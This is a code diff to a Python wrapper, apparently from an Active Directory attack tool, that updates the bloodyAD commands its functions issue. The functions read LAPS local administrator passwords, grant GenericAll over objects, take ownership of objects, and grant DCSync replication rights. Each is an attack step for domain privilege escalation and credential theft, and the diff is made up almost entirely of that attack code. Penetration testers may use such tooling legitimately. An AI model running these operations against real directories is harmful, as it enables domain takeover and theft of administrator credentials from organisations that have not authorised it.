@@ -350,7 +350,7 @@ async def read_laps(
     """
     sam = target if target.endswith("$") else f"{target}$"
     return await run_bloodyad(
-        ["get", "object", sam, "--attr", "ms-mcs-admpwd", "--attr", "ms-LAPS-Password"],
+        ["get", "object", sam, "--attr", "ms-mcs-admpwd,ms-LAPS-Password"],
         config,
         auth_args=auth_args,
     )
@@ -414,8 +414,7 @@ async def set_generic_all(
         Standardised result dict.
     """
     return await run_bloodyad(
-        ["set", "object", target_dn, "--attr", "nTSecurityDescriptor",
-         "--addRight", principal_dn, "--right", "GenericAll"],
+        ["add", "genericAll", target_dn, principal_dn],
         config=config,
         auth_args=auth_args,
         timeout=timeout,
@@ -442,7 +441,7 @@ async def set_write_owner(
         Standardised result dict.
     """
     return await run_bloodyad(
-        ["set", "owner", target_dn, "--owner", new_owner_dn],
+        ["set", "owner", target_dn, new_owner_dn],
         config=config,
         auth_args=auth_args,
         timeout=timeout,
@@ -459,10 +458,12 @@ async def set_write_dacl(
 ) -> dict[str, Any]:
     """Grant a specific ACL right on a target object to a principal.
 
+    Routes to the appropriate bloodyAD subcommand based on the *right*.
+
     Args:
         target_dn: Distinguished name of the target object.
         principal_dn: Distinguished name of the principal.
-        right: The right to grant (e.g. ``WriteDacl``, ``WriteProperty``).
+        right: The right to grant (e.g. ``GenericAll``, ``DCSync``).
         config: PathStrikeConfig instance.
         auth_args: Optional pre-built auth arguments.
         timeout: Maximum seconds to wait.
@@ -470,9 +471,13 @@ async def set_write_dacl(
     Returns:
         Standardised result dict.
     """
+    if right == "DCSync":
+        args = ["add", "dcsync", principal_dn]
+    else:
+        args = ["add", "genericAll", target_dn, principal_dn]
+
     return await run_bloodyad(
-        ["set", "object", target_dn, "--attr", "nTSecurityDescriptor",
-         "--addRight", principal_dn, "--right", right],
+        args,
         config=config,
         auth_args=auth_args,
         timeout=timeout,
